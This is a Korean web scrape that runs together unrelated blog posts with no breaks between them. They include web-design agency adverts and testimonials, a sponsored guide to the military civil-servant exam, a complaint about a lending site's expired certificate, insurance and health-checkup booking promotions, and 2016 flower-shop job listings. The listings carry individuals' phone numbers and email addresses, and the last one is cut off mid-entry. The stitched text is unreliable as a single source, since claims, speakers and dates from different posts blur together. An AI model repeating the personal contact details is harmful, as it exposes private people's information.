마음이 싱숭생숭하셨다고 말씀하시더라고요.하지만 홈페이지제작을 함으로써 펜션을 알리는새로운 루트가 생기기도 했고, 도전이기도 했습니다.처음 온라인에 보이는 펜션이지만믿을 수 있는 업체에서 맡길 수 있다는 점이보람이 있고 가장 감사한 부분인 것 같습니다.제가 알아볼 때는 경력도 탄탄하면서도온라인으로 어떻게 매출을 끌어올리고펜션을 더 많은 분께 알려드릴 수 있을지도꼼꼼하게 컨설팅해 주시는 걸 보고여기다! 생각했었던 것 같습니다.이런 쪽에 대한 정보를 많이 모르기도 하고그러한 지식이 없기 때문에 걱정이 무척 많았던 부분이 있기도 했었지만,다한웹이라는 곳에서 마음에 쏙 들게 해주셔서지금은 1도 후회 없이 펜션 운영에 도움을 받고다음에 필요할 때 다시 찾게 될 것 같다는 생각이네요.아 참, 저도 이벤트를 보고 신청을 하게 되었는데필요하신 분들은 아래 이미지 보고 이용해보시면좋을 것 같다는 생각이 드네요. 우리는 조금이라도 아끼면서퀄리티 좋은 곳에 맡기는 게 일석이조가 아닐까요?  안녕하세요.​새로운 아이템 및 아이디어로 사업장이나 장사를 계획중이신 분들이라면#홈페이지제작 을 먼저 생각 하셨을꺼예요~​ © YvonneScholz, 출처 Pixabay ​사업장이나 장사 준비하기도 바쁜데 홈페이지 제작 할려고 알아봐야하고하나하나 자료준비해야하고 무척 힘드실꺼예요​  ​귀찮다고 아는사람에게 부탁했다가 관리도 안되고 연락도 안되고 더 힘들어 지게되죠..​  ​그래서 홈페이지 전문 제작 업체에서 제작하는걸 추천드려요~ ​홈페이지 제작 업체를 알아보실때는 제작도 중요하지만그보다 더 중요한건 관리(유지보수) !!​작든 크든 비용을 들여서 홈페이지를 만들었는데관리가 안된다면 ......홈페이지 사용중 오류가 생긴다거나 홈페이지가 갑자기 안나온다면 딱 멘붕오기 좋은...휴...​  ​우선 홈페이지 제작 전문 업체를 알아보실때는우선적으로 오래되고 탄탄한 곳을 찾는게 중요해요.​최소 홈페이지 제작 업체가 10년 이상 되었다면10년 이상의 경험과 노하우도 있을테니믿을만 하다고 보시면 되겟죠~​  ​믿을만한곳 몇군대를 찾은다음 견적의뢰를 하셔야 하는데요~정확한 견적을 내기 위해서는 참고사이트 및 제작할 홈페이지의 페이지수 그리고 간단하더라도 웹에서의 프로그램이 들어가냐 아니냐에 따라 견적이 엄청 차이나게 되요 © markusspiske, 출처 Unsplash ​이 정도만 준비하시면 홈페이지 제작 업체들의 견적을 받아볼 수 있답니다.​전자제품 구입은 다나와같은 비교사이트에서 저렴한 곳만 찾아서 구입만 하면 되지만홈페이지 견적은 하나하나 따져보고 계약하시는 게 좋아요​ © cytonn_photography, 출처 Unsplash ​홈페이지 제작 회사들마다 장단점은 꼭 있을 거예요a 회사는 홈페이지는 퀄리티가 좋은데 유지 보수가 약하고b 회사는 유지 보수가 잘 되는 거 같은데 홈페이지가 약한 거 같고...​2000년도 정도에는 홈페이지 만드는데 퀄리티 차이가 많았어요~​하지만 특별한 주문형 웹 프로그램이 들어가는 게 아니라면10년 이상 된 회사들은 퀄리티가 거의 비슷하다고 보시면 돼요​홈페이지 제작 회사에는 디자이너도 여러 명이 있을 거고각각 디자이너분들마다 실력이 다르기 때문에어떤 디자이너가 작업하게 될지는 계약을 해봐야 할 수 있어요​그러니 어차피 몇 군데 괜찮은 곳을 골라서 견적의뢰해서 받은 거니그중에 홈페이지 유지보수가 괜찮은 곳을 고르시는 게 제작 완료 후 스트레스 덜 받을 거라고 생각해요전자제품 고를 때 a/s가 잘 되는 곳을 고르는 것과 같아요​  ​제가 쓴 글을 읽어보시고 홈페이지 업체 선정에 도움이 되셧으면 좋겟네요^^​​추가적인 설명 및 다른 정보로 돌아오겟습니다.읽어 주셔서 감사합니다 ^^화이팅!​​​  ​ 아이티포원 IT FOR ONE부산경남,홈페이지,모바일,쇼핑몰,어플 제작전문,14년노하우 4,000여군데 제작관리중.itforone.co.kr 아이티포원부산광역시 해운대구 센텀동로 57 부산디자인진흥원 505-1호  ​​ 드림포원RECENTLY PORTFOLIO 현대토지보상 http://www.hd-land.co.kr 기업이윤과 기업가치 중심의 차별화된 고객 서비스를 통하여 보상업무 단계별 직무분석에 기초한 체계적인 관리시스템과 보상업무, 민원사무, 행정업무, 토지수용 업무 등을 원스톱으로 지원하고 펜션블랑 http://www.stayblanc.com 아름다운 풍경이 함께하는 편안한 휴식처, 펜션블랑은 사람들의 편안한 휴식처이자 따뜻한 감성을 담고 있는 특별한 장소입니다. 두리스쿠버다이빙 http://www.duridive.com 두리스쿠버다이빙은 최고의 ...dreamforone.com 드림포원서울특별시 구로구 디지털로33길 55 이앤씨벤처드림타워 2차 409호   ​ 안녕하세요, 별찌입니다.반응형웹 홈페이지제작으로저렴한 제작비용에 효율적인 사용을 해보세요.   한 번의 제작으로 PC, 모바일, 태블릿PC 등 모든 기기에자동으로 최적화되어 보이는 반응형웹 홈페이지제작!​요즘같이 모바일 접속 비율이 높고 다양한 크기의 기기가 많은 만큼반응형 웹홈페이지제작은 필수입니다.   기기별 가독성이 뛰어나고,하나의 페이지 수정으로 다양한 기기에 동일하게 자동 반영이 되죠.​저렴한 비용으로 홈페이지 제작을 원하신다면별도의 지식이 없어도 쉬운 홈페이지 관리를 원하신다면!​바로반응형웹 홈페이지제작이 정답입니다.   그동안 회사, 단체/기관, 학교, 소상공인 업체, 개인 사이트 등다양한 곳에서 필요한 홈페이지 제작!​고객 니즈를 반영한 맞는 맞춤 기획, 디자인으로다양한 포트폴리오를 통해 직접 확인하실 수 있습니다.   1:1 제작 담당자와 전담팀 구성으로남들과는 다른 특별한 반응형웹홈페이지 제작을 해드립니다.   제작 후 관리도 확실하게!쉽고 빠르게 수정을 할 수 있는 관리자 페이지 제공과유지/보수 전담팀이 고객님들의 홈페이지 수정/보수를 도와드립니다.​ 반응형홈페이지 제작사례반응형홈페이지 제작사례,반응형쇼핑몰 제작사례,반응형웹 제작사례,반응형홈페이지 포트폴리오byulzzi.com 더 자세한 안내와 포트폴리오 확인은 홈페이지 참고 바랍니다.견적 및 상담문의는 언제든 환영입니다.감사합니다 :)      ​   ​홈페이지/웹사이트/쇼핑몰유지보수/솔루션개발 부터호스팅까지 한 번에 맡길 수 있는 케이알유니스입니다!​ 케이알유니스- Total IT Solutions솔루션,S/W개발,IDC사업,홈페이지제작www.kui.co.kr  1999년 설립 이후 20년째,오랜 노하우가 녹아있는 기업으로기업 담당자 뿐만 아니라 사용자의 편의까지 생각해 만듭니다.​ 각 분야별 전문인력을 구성해첫 초기상담부터 함께 제작방향을 구상하고 제안하며,전문 웹디자이너가 홈페이지를 제작합니다.  ​1인 1스마트폰 시대가 되어 쉽게 검색하고, 쉽게 찾아볼 수 있는 요즘!회사를 설립하거나 창업하면마케팅과 홍보를 위해홈페이지는 필수인 시대가 되었죠.​홈페이지 관리자모드로 로그인,기업 담당자가 직접 관리할 수 있어유지보수비용을 절감하고​서울금천구에 IDC데이터센터가 있어웹호스팅/서버호스팅 까지 모두 케이알유니스에서 직접관리합니다.​  ​   ​다양한 분야에서 비즈니스파트너로선택해주시는 케이알유니스가 제작한웹사이트/홈페이지 포트폴리오는아래 홈페이지를 참고해주세요!▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼​    ​홈페이지 제작 상담신청은 전화주시거나홈페이지에 남겨주시면 담당자가 확인 후 빠르게 도와드리며직접 제작센터로 오시는 경우 미리 약속하고 방문해주시면기다리지않고 상담받으실 수 있습니다!​ 케이알유니스경기도 시흥시 서울대학로 59-21 로얄팰리스테크노타운 1차 406호  ​경기도 시흥시 서울대학로 59-21,배곧로얄팰리스테크노 1차 406호 케이알유니스대표전화 : 1544-0932​    ​ 네이버 블로그는 맞지만, 확인불가 홈페이지유지보수, 홈페이지관리 해주는 업체 찾는 법, 아라보고!   ​산학협력단에서 일하고 있습니다.자체적으로 운영하고 있던 회의실이일반 학생들도 쓸 수 있게끔 내부 조정이 됐는데요.신청자를 게시판의 신청서로 받았는데인원이 너무 몰려서 조금 관리가 안되는 상황이었습니다.그래서 저희 기존 홈페이지에다가 예약을 받아서 조율하기로 했는데요.저희 홈페이지에는 원래 예약 시스템이 없습니다.그냥 게시판 한 두 개 있고, 협력단 소식이나 소개 정도만 쓰고 있어요.좀 예전에 만든 홈페이지이긴 하지만굳이 여기서 더 바꾸고 싶진 않았습니다.​   ​나름대로 찾아보니 '홈페이지 유지보수'라는홈페이지관리 서비스가 있더군요.고작 기능 하나 때문에 홈페이지를 새로 만들 수는 없으니지금 저희에게 맞는 서비스라고 생각했습니다.하지만 생각보다 업체를 찾는 건 쉽지 않았습니다.홈페이지관리도 회사마다 규정이 다른 것 같더라고요.1년 단위로 결제하는 곳도 있고,기능은 별도 추가 견적이 들어가는 곳도 있고,범위가 넓은 대신, 제작보다 유지보수가 더 비싼 곳도 있었습니다.꾸준히 홈페이지관리를 검색해 봤지만저희가 원하는 조건을 가진 업체는 찾기 힘들었어요.​   ​하지만 결과적으로는 저희와 맞는 좋은 업체를 찾아서기능도 추가하고, 덧붙여 홈페이지관리도 주기적으로 받을 수 있게 되었는데요.제가 직접 유지보수 업체를 찾은 건 아니고'아라보고'가 연결해준 덕분이었습니다.홈페이지를 비롯해서 각종 설비, 공사 관해서 문의를 남기면전문가들이 답을 주는 형태의 서비스였는데딱히 비용드는 것도 없고 답변도 굉장히 빨리오는 편이라 좋았습니다.프리랜서를 비롯해 여러 업체들이 연락을 주었는데그 중엔 저희 요구사항을 정확하게 파악해준 업체가 있었습니다.​   ​지금은 기존의 형식 그대로 유지하면서도없던 기능을 추가해서 홈페이지를 운영하고 있습니다.해당 업체를 통해 주기적으로 홈페이지관리도 맡기고 있고피드백이 빨라서 좋았습니다.아라보고가 아니었다면 이 업체를 찾지 못했을지도 모르겠네요.처음 홈페이지제작 할 때도 업체를 찾지 못해서 어려웠는데그 때 아라보고를 알고 있었다면 더 빠르게 일을 처리했을 거라는 생각이 듭니다.저처럼 업체를 선정하지 못해서 고민이신 분이라면아라보고 사용을 권해봅니다.  아라보고 이용 사례를 재구성한 글입니다.  ​ ​​안녕하세요. 군무원 필기 시험일까지 약 2주정도 남은 상황이에요! 작년 이맘때쯤 맘 졸이며 공부하던 생각이 나서 저만의 학습 방법을 이야기 해보려고 해요! 올해 군무원 채용 인원에 대해서 전부터도 계속 역대급이라는 소리가 자주 들렸어요! 3년 전과 비교해보면 약 5배 가량 증가하고 있기 때문에 일찍 서두르길 잘했단 생각이 드네요! ​​군무원 원서접수는 부대별로 상이하지만 그 중 가장 많은 분들이 지원하는 ‘육군’은 육군 군무원 채용 관리 홈페이지에서 접수할 수 있습니다. ​​​ ​​이 외에도 군시생들이라면 적극적으로 활용할 수 있는 것들이 정말 많아요. 저 역시 군시생 시절 육군 군무원 채용관리 홈페이지에 자주 들락거렸었죠. 원서 접수는 홈페이지 접속 후 메인 화면에 보이는 ‘원서접수’ 칸을 눌러 로그인 후 접수하면 됩니다.​​또 채용공고 메뉴 중 경쟁률 정보를 확인하시면 원서 접수 이후 직렬 별로 모집인원이나 지원인원, 경쟁률을 공채와 경채로 나눠서 볼 수 있습니다. 제가 본 2020년 경쟁률은 총 16.4:1로 확인 되었으며 총 5만7792명이 응시했습니다. 국방부와 육해공군에서 접수한 결과를 살펴보니 4139명 선발인원 중 6만명이 응시했으며 점점 더 많은 인원이 몰리고 있는데요. 응시 인원이 늘어난 이유에 대해서 국방부 자료를 살펴보면 영어와 한국사 능력검정시험이 일정 기간 연장되면서 수험생의 부담을 줄어준 것이라고 합니다.​​​ ​또한 육군 군무원 채용관리 홈페이지에 들어서면 ‘시험안내’ 메뉴 칸에서 군무원 선발 업무 주관부서, 시험 방법, 채용 시험 응시연령 등 자세한 정보들을 검토할 수 있는데요. 제가 준비한 육군의 경우 육군 인사사령부에서 6급 이하 선발대상을 가지고 있습니다. ​​채용 공고로는 원서접수 -> 서류전형(경력경쟁채용) -> 필기시험 -> 면접시험 -> 합격자발표 -> 채용후보자등록 -> 임용순으로 진행이 됩니다. 또한 응시 연령 나이 대는 7급 이상의 경우 20세 이상만, 8급 이하의 경우 18세 이상부터 가능합니다. ​​​ ​​​이처럼 육군 군무원 채용관리 홈페이지에서 다양한 정보들을 검토할 수 있었습니다. 채용공고와 더불어 채용 정보, 인사제도, 지원서 작성, 결과조회 , 채용 Q&A등 초시생들에게 딱 알맞은 내용을 제공하고 있었거든요.​​앞서 비슷한 맥락으로 응시 인원이 높아진 이유에 검정제 기간이 연기 되었다는 것도 있었지만 이 외에도 선발 인원이 증폭 된 것도 한 몫 하고 있습니다. 올해는 작년보다 약 2300여병 정도의 인원을 선발할 것이라는 공지를 밝혔고 약 6490명이 채용 될 예정이라고 합니다. 물론 국방부, 육군, 해군, 공군으로 나눠서 선발되고 있지만 그럼에도 불구하고 꽤 많은 인원이라 생각해요!​​​ ​​​육군 군무원 채용관리에서도 알 수 있는 내용이지만 최종 합격자 결정 방법은 어떻게 되는 것인 것 자세히 말씀 드리도록 하겠습니다.​1)서류전형 : 이는 경채에만 해당되며, 응시자의 경력이나 학력 전공과목 등과 임용예정직급의 직무 내용과의 관련 정도에 따라 합격 여부가 결정 됩니다.2)필기시험 : 공채시험 응시자 및 경채 응시자 모두에게 해당 되며 객관식으로 출제 되고 한 과목당 25문항씩 출제 됩니다. 시험 시간은 과목마다 25분씩 주어지며 매 과목 4할 이상, 전 과목 총점의 6할 이상 득점한 자중에서 고득점자 순으로 선발예정인원의 15할의 범위 안에서 합격자를 결정합니다. 3)면접시험 : 군무원으로서의 정신, 전문지식과 응용능력, 의사표현의 정확성, 논리성, 창의력, 의지력, 발전가능성, 예의, 품행, 성실성등을 상, 중, 하로 점수가 매겨지며 고득점자 순으로 합격자가 결정됩니다.4)합격자 결정 : 필기시험점수와는 상관없이 면접시험 성적 순으로 결정이 됩니다. 신원조사와 공무원채용신체 검사에서 모두 적격 판정을 받은 사람이 최종 합격로 결정됩니다.​​​ ​​​군무원은 직렬도 굉장히 다양하고 그에 따라 하는 업무 역시 제각기 다릅니다. 총포, 유도무기, 일반기계, 전차 등 다양하게 있지만 저는 그 중에서 행정직을 맡았어요.​​여기서 하는 주된 업무는 국방정책, 군사전략, 평가, 제도, 계획, 연구업무-일반행정, 정훈, 심리업무-법제, 송무, 세출결산, 재정금융 조사분석 등에 관한 업무를 종합적으로 맡고 있어요. ​​​ ​​​제가 준비한 행정직 9급의 경우 국어, 영어, 한국사, 행정법, 행정학 이렇게 다섯 과목을 준비해야 됐어요. 영어는 토익이나 토플, 지텔프 등이 있었고 한국사는 한국사능력검정시험을 준비하면 됐기 때문에 한 달 정도 성실히 준비했어요. ​​1년에 딱 한번의 기회만 있기 때문에 잘해야 된다는 부담감이 압도적이었지만 이 두 과목을 단축시킬 수 있다는 점에서 큰 메리트를 느꼈어요. 일반 9급이나 7급은 이것보다 훨씬 더 많은 양을 공부해야 되고 합격율도 치열한 편이지만 군무원은 꾸준히 채용인원이 증가되고 있거든요.​​​​ ​​사람들이 몰려서 경쟁률이 높아진다고 하더라도 모집하는 인원이 많은 행정직렬 특징 덕분에 장기적인 과정을 거치면서 준비할 수 있었습니다. 국어는 그렇다 쳐도 행정법과 행정직은 처음 공부하는 분야라서 인강을 통해 학습 방법을 구축했어요. ​​​ ​​​​행정학이나 행정법은 이름만 들었을 때 비슷한 내용이겠구나 했는데, 막상 공부해보니 완전 결이 다르더라고요. 행정이라는 같은 뿌리에서 파생만 되었지 완전히 다른 개념이었어요. 그래도 교수님께서 기본적인 파트를 정리 해주시고 출제 유형에 맞게 민사재판, 소송, 효력 등 꼼꼼하게 학습 해주신 덕분에 좋은 결과를 얻었어요! 여러분들께서도 육군 군무원 채용관리 홈페이지를 체크하셔서 채용 변화나 시험 흐름을 파악하신 뒤 준비하시길 바랍니다.​ 해커스 공무원 :: 최단기합격1위 해커스공무원*헤럴드 선정 2018 대학생 선호브랜드 대상"최단기합격 공무원 학원 부문 1위* 해커스공무원, 합격할 때까지 무제한 수강, 합격시 100% 환급!mgosi.hackers.com ​본 포스팅은 해당업체 지원을 받아 작성하게 되었습니다. ㅋㅋ 2019년 11월 17일펀다는 주말에 투자하면 +수익률을 주기 때문에 접속을 하려 했다.어라?   홈페이지 접속이 되지 않는다.익스플로러로도 접속이 되지 않지만,    무슨 일인지 궁금하여 강제로 접속을 해 보았다.그랬더니 웹 사이트에서 제시한 보안 인증서가 만료되었다고 나온다.   ㅋㅋ아니 보안이 되지 않는 사이트에 도대체 누가 투자를 하라는 것인가?   전에 홈페이지가 다운되었을 때에도 아무런 공지가 없어서 욕한 적이 있었다.​펀다는 그 어떤 p2p 홈페이지들보다도 느리다.​반응도 형편없고,​이럴 거면 도덕책... 핀테크 기업이라고 이름을 달지 말아야지...​그리고 인증서를 코모도 RSA를 쓰는데... 저거50만 원 한다.​너무 돈 아끼려는 게 보인다.​전에 직원도 통화하면서 자기네 직원 수가 너무 없어서 너무 힘들다 변명하던데...(일을 똑바로 하라고 말했더니, 그걸 왜 나한테 투정하는데?)  하...펀다 홈페이지 불안해서...출금하려고 접속했다.   아니...전액을 클릭해도 숫자가 안 적힌다.수동으로 숫자를 적어서 클릭했더니...   출금도 안된다.​이거 문제가 심각하다.​​ 네이버 모바일 홈페이지 모두블로그에 모두주소 넣고,모두에 블로그 주소 넣고페이스북에 모두 주고 넣기트위터에 모두 주소 넣기위임 기능 활용사이트 관리 상단에 권한 위임하기모바일 홈화면 추가qr코드  주소 넣기scany.net( qr 코드 공급 사이트)활용 인쇄물 강의교재, 플랜카드회사홈페이지는 웹상에서의 얼굴입니다.내 얼굴이 어떻해 고객들에게 비춰졌으면 좋을까??   ​회사를 운영하시는 대표님은!!고객에게 무엇을 먼저 내어놓을까?고객은 무엇을 보기 원할까??정말 많은 생각을 갖게 합니다.​   ​저희 익스텐더는!!잘 듣습니다.대표님의 이야기회사의 이야기주신 내용들을 꼼꼼히 적어웹상에!!홈페이지상에 어떻해 표현할까?많은 고민을 합니다.​   ​최선을 다하여 준비해주신~자료들을!!저희의 기술과경험들을 토대로!!제안해드리고~저희의 눈으로풀 수 있는 최적의 방법들을제시해드립니다.​   ​고객한분이 정말 소중한이 시대에!!성공적인 비즈니스을 위해최선을 다하여 함께 해드리겠습니다.​디지털시대에~모든고객들이 홈페이지 방문했을때!!좋은인상을 남겨드리고 싶습니다.​   제안 드렸던 재미있는 이야기 (1)대표님께서 직접 그린 그림을 메인화면 이미지에 표현건축사님이셔서 그림솜씨가 좋으십니다.액션효과까지 넣었습니다.   ​깨끗하고 심플함으로 제안 드렸던 이야기 (2)여백의미!!그리고 정말 보여주고 싶으신 포인트만!!​   ​글자체와 간격그리고 어울려지는 색감까지 하나하나 잡아드렸습니다.보여지는 화면이 한정적이라 한포인트 한포인트 소중합니다.   ​제안 드렸던 재미있는 이야기 (3)요양원 방문 하시는 분들이 나이대가 있으셔서..보다 직관적으로 더 제작하였습니다.메뉴들을 블록화 시켜!!​   ​모바일 버젼은마치 앱처럼 제작해드렸습니다.​   ​제안 드렸던 재미있는 이야기 (4)한국실내건축가협회는 보여주는 이미지가 중요하기에!!좀 더 눈에 띄는 색상을 사용해고객들이 볼 때 색감적으로인상이 강하게 느껴지도록!!제안해드렸습니다.​   ​제안 드렸던 재미있는 이야기 (5)교회에서 운영하고 있는 사단법인에서!!지부들이 전세계적으로 퍼져있어..한 눈에 표현됐으면 하고저희에게 요청해왔습니다.그래서 이렇게 ㅎㅎ레이더같이 동작도 넣었습니다.​    제안 드렸던 재미있는 이야기 (6)로고와 액션이 함께!!로고에 마우스를 대면그에 따른 케릭터가 슝 ㅎㅎㅎ재미난 홈페이지입니다.​   ​제안 드렸던 재미있는 이야기 (6)네이버 처럼 스와이프기능!!오른쪽 왼쪽 화면을 밀때~이전화면,다음화면이 표현되어집니다.협회회장님의 특별한 요청으로구현해드렸습니다.​   ​이렇게 다양하고 재미난 이야기 차고 넘칩니당 ㅎㅎ  또,저희는 별도의 관리자페이지가있습니다.좀 더 쉽게!!홈페이지관리를 위해!!!​   내부페이지 살짝 오픈해드립니다 ^^   보통 홈페이지 제작 의뢰가 오게 되면 ^^현장미팅을 하게됩니다.   미팅 전~준비하셔야 할 사항은??그래야 풍성함이 넘치는 기획회의를 하실 수 있습니다.​1.벤치마킹 할 사이트 준비-2개 사이트​2.카테고리 정리-상위,하위카테고리 정리 하셔야 합니다.​3.카테고리에 들어갈 이미지,텍스트들을 정리​4.회사로고-홈페이지 색상 및 컨셉을 정하는데 중요한요소입니다.​   ​이렇게 기획회의 후~대략1주 후 첫번째 피드백을 드립니다.URL로 드리구요..보시면서 수정및 보완 사항들을 체크해주시면 됩니다.이렇게 2,3차 피드백을 통해 홈페이지 완성하게 됩니다.​   ​ 제작한 포트폴리오입니다.​   ​보험업​   ​캠핑&펜션​   ​교회​   ​펜션​   ​스튜디오​   ​회사​   ​외식회사​   ​더 많은 홈페이지 포트폴리오와 샘플을 보실려면요기로 들어가셔서 보시면 됩니다 ^^ (주)익스텐더반응형홈페이지, 홈페이지제작, 기업홈페이지, 펜션홈페이지, 예약홈페이지, 모바일웹, 앱, 국내최저가, 홈페이지, 홍보형홈페이지, 분양홈페이지, 쇼핑몰, 오픈마켓refuses.2xtender.com ​현장미팅도 가능합니다 ^^홈페이지 들어오셔서 실시간채팅으로!!2xtenders@gmail.com 주식회사 익스텐더탬플릿형, 반응형홈페이지제작, 어플제작, 익스텐더, 기업홈페이지, 모바일웹, 모바일홈페이지, 무료홈페이지, 저렴한홈페이지, 홍보형홈페이지, 홈페이지제작2xtender.com ​   #브랜드마케팅 #홈페이지제작업체 #사이트제작 #홈페이지관리 #반응형웹#웹에이젼시 #웹사이트제작 #반응형홈페이지제작 #기업웹사이트#중소기업웹사이트 #기업사이트 #기업홈페이지솔루션 #회사웹사이트 스마트한 보험 관리!삼성화재 홈페이지를 이용해 보세요​​​  로그인과 인증은 간편하게, 중요한 보험 정보는 바로바로, 정보 변경은 손쉽게! 삼성화재 홈페이지를 이용하면 보험 관리가 스마트해집니다.​  간편해진 로그인/인증​​   삼성화재 홈페이지에서는 다양한 방법으로 로그인이 가능합니다.   또한 업무 처리는 공인인증서 없이도 가능하다는 사실!​   모바일 앱에서 6자리 비밀번호를 설정해두면, 비밀번호 입력 만으로도 업무 처리 가능하답니다.​ 더욱 쉬워진 보험 관리​​홈페이지에서 로그인만 하면 알람이 띵동! 놓치고 있는 보험료, 만기 계약 관리, 보상 진행 안내, 가입한 상품 혜택 까지 알려드린답니다.보험료 납입도 가능하다는 사실! ​​  정보 변경도 홈페이지에서​​   자녀보험에 가입하신 고객님이라면?​​   홈페이지에서 출생정보만 입력하면 자녀 등록이 완료 됩니다.    내 주소나 연락처, 직업 등 정보 변경도 홈페이지에서 쉽게 하실 수 있습니다. ​   내가 필요할 땐 언제 어디서나!   삼성화재 홈페이지에서 스마트하게 보험을 관리해 보세요! ​ 당신에게 좋은보험 - 삼성화재삼성화재에 가입한 보험계약 확인, 보험료 납입, 계약 변경, 보험금 청구 등 계약 관련 업무를 편리하게 이용하실 수 있습니다.samsungfire.com #삼성화재 [삼성화재 안산 시화 화성 - 법인보험]기업종합보험 및 개인보험컨설팅samsungfireansan.modoo.at ​한국건강관리협회 메디체크는 건강검진만으로 전문으로 실시하는 전문의료기관으로 다양한 건강검진 서비스와 함께 개인별 맞춤 건강증진 서비스를 제공하고 있습니다^^ 전국 16개의 검진센터를 운영하고 있어 누구나 쉽게 내원하며 건강검진을 비롯한 서비스를 이용하실 수 있는데요. 오늘은 건강검진 예약 방법에 대해 알아보도록 하겠습니다.한국건강관리협회 메디체크의 건강검진은 각 지부의 고객문의전화 상담과 한국건강관리협회 공식 홈페이지를 통한 검진예약을 접수 받고 있는데요. 홈페이지 예약의 경우에는 클릭 몇 번으로 아주 간편하게 예약이 가능하답니다. 물론 검진 날짜와 항목 등은 상담원과 통화 후에 최종적으로 확정되지만, 인터넷 예약을 통해 검진 프로그램 종류와 금액 정보까지 확인할 수 있기 때문에 훨씬 편리하실거에요^^ 예약자 정보도 인터넷 예약을 통해 미리 입력하면 센터 방문시에 번거롭지 않답니다~​1. 한국건강관리협회 메디체크 공식 홈페이지 방문 후 좌측 상단의  ‘검진예약’ 클릭한국건강관리협회 메디체크 공식 홈페이지에는 한국건강관리협회 메디체크에서 진행하는 여러 건강검진 관련 정보와 함께 검진절차, 검진시주의사항, 나에게맞는검진 등 다양한 정보를 제공하고 있습니다. 꼭 건강검진 예약 때문이 아니더라도 공식 홈페이지에 자주 방문해주세요~ 건강한 읽을거리가 다양하답니다^^​2. 종합검진, 기업(단체)검진, 해외(동포)검진 확인일반 검진예약자의 경우에는 상단의 ‘종합검진 예약’ 버튼 클릭!한국건강관리협회 메디체크는 개인 건강검진 외에 기업(단체), 해외(동포)를 대상으로 하는 건강검진도 진행하고 있는데요. 관련 자세한 정보는 지부에서 상담을 받으셔야 합니다^^​‘종합검진 예약’ 버튼 클릭하면 누구나 쉽고 간편하게 건강검진 예약이 가능하고 관련 정보를 확인할 수 있도록 새롭게 도입한 ‘건강검진 예약’ 창이 새로 나타나는데요. 이제부터 본격적인 메디체크 예약이 시작된답니다.3. 검진 프로그램 선택(센터, 성별, 검진프로그램 선택)간편하게 마우스 클릭을 통해 방문 센터와 성별, 검진프로그램을 선택하면 총 예상 검진 비용을 바로 확인할 수 있는데요. 전국 16개 전문 센터가 서울을 비롯해 전국의 도 단위 마다 한 곳씩 운영되고 있으니 현재 거주지에서 가장 가깝거나 방문하기 편리한 곳으로 선택하시면 됩니다. 참고로 센터와 성별을 모두 선택해야만 검진프로그램을 선택할 수 있으니 꼭 상단부터 단계별로 진행해주셔야 합니다^^ ​서울 송파구에 위치한 강남지부 방문, 남성 기본플러스종합검진을 선택하고, 검진 프로그램에 따른 추가 항목인 위내시경과 CT 항목까지 선택하면 총 예상 검진 비용이 표시된답니다. 물론 할인, 추가검진 등 실제 검진비용은 달라질 수 있지만, 대략적인 검진 비용을 미리 확인할 수 있다는게 참 편리하네요^^ 많은 사람들이 건강검진과 관련해서 가장 궁금해 하는 부분이 비용인데요. 한국건강관리협회 메디체크는 모두 공개를 하고 있습니다~ 참고로 다양한 검진프로그램의 세부 내용은 ‘프로그램 보기’ 버튼을 클릭하면 확인할 수 있답니다.4. 검진 날짜 선택(희망검진일자 선택)그리고 방문을 희망하는 날짜와 오전/오후를 선택하면 예약 완료! 방문 시간은 예약 접수 후에 센터 상담원과의 전화통화를 통해 최종적으로 확정하시면 됩니다.​​5. 예약자 정보 입력마지막으로 이름, 성별, 생년월일, 연락처를 남겨주시면 최종적으로 예약이 완료된답니다^^홈페이지 방문에서 예약완료까지 5분이면 끝! 정말 쉽고 간단하죠~ 예약 완료 후에 공식 홈페이지 내예약확인 페이지를 통해서 예약일자와 정보를 확인할 수도 있답니다. 한국건강관리협회 메디체크 공식 홈페이지 회원이라면 좀더 쉽게 예약과 정보확인을 할 수 있으니 회원가입도 하는 센스!한국건강관리협회는 전 국민 누구나 쉽고 간편하게 건감검진을 비롯한 건강증진프로그램을 접할 수 있도록 많은 노력을 하고 있습니다. 앞으로도 한국건강관리협회 메디체크와 관련된 다양한 정보를 소개해드리겠습니다^^  상호 :(주)허니비제이플라워 (일산킨텍스점) 주소 :일산 킨텍스제2전시장 내 플라워샵 홈페이지 :http://m.blog.naver.com/honeybee6971 (블로그참조) 고용형태 :정직원 주업무 :매장업무, 웨딩업무 급여 :시급 6,500원 4대보험유무 :지원자격 :초보자가능( 웨딩준비업무이며 꽃다듬기 등 기본적인 업무입니다.) 근무시간 :09:00~18시 (스케쥴에 따라 변동이 있습니다) 지원방법 :성함/나이/사시는곳 문자남겨주시면 연락드리겠습니다. 연락처 :010-9128-6917 이메일 :dream6971@daum.net 게시일 2016.09.21상호 :더 플라워주소 :경기도 김포시 구래동 5419-1 센트럴프라자 2홈페이지 :고용형태 :정직원 및 경력자 시간당 알바[알바는 시간 조정가능}주업무 :전반적인 꽃집 업무{꽃다발.꽃바구니.식물식재..등등}급여 :경력자140 {수습기간 6개월}이후 인상 .경력알바는 시간당 65004대보험유무 :무지원자격 :꽃집 경력자 최소 6개월이나 1년이상 .시간당 알바도 최소 6개월이상근무시간 : 정직원 오전 10시 ~오후 8시.토요일 근무시까지는 ㅣ시간당 6500휴일 :정직원일경우 토.일 지원방법 :연락처 :010-3344-3700이메일 :flora0005@naver.com게시일 2016.09.22상호 :데코플라워주소 :서울 구로구 신도림동 337 대우미래사랑 시티 B1 홈페이지 :무 고용형태 :아르바이트 주업무 :꽃집 전반적인 업무 급여 :상담후 결정 4대보험유무 :무 지원자격 :경험자 근무시간 : 월화수금토 오후5-10 .목오후2-10 휴일 :일요일 지원방법 :이메일 지원하시고 전화주세요 연락처 :010-8903-2689 이메일 :spi3232@naver.com 게시일 2016.09.22상호 : 네이쳐디자인 주소 :구로 디지털단지홈페이지 :고용형태 :아르바이트 주업무 :플라워 컨디셔닝, 화기세척 및 운반, 테이블 플라워 셋팅, 기타 정리정돈 등 전반적인 셋팅 어시스트 급여 :시급 7,000원 (식사제공) 4대보험유무 :지원자격 :플로리스트 (초보도 가능합니다. 성실히 작업해 주실 분들 환영합니다.) 근무시간 : 09:00 - 18:30 (작업 상황에 따라 작업 시간에 변동이 있을 수 있습니다.) 휴일 :지원방법 :문자지원 (이름/성별/나이/거주지/웨딩 셋팅 경력 유무 or 기간) 연락처 :010-5014-0797 이메일 :하고싶은말 :문자 주시면 연락 드립니다. 문자만 주세요.게시일 2016.09.22상호 : 메리제이플라워주소 : 서울 마포구 동교동 154-7(홍대)홈페이지 : http://blog.naver.com/merryj0329고용형태 : 정직원(3개월 수습기간)주업무 : 